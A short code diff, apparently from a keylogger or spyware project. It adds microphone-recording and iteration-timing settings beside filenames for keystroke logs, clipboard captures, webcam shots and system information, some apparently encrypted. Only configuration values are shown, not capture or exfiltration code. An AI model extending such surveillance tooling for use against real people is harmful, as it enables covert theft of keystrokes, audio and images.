@@ -24,3 +24,7 @@ webCamShot_info = "webCamera.png"
 keys_info_e = "e_key_log.txt"
 system_info_e = "e_systeminfo.txt"
 clipboard_info_e = "e_clipboard.txt"
+
+microphone_time = 10
+time_iteration = 15
+number_of_iterations_end = 3
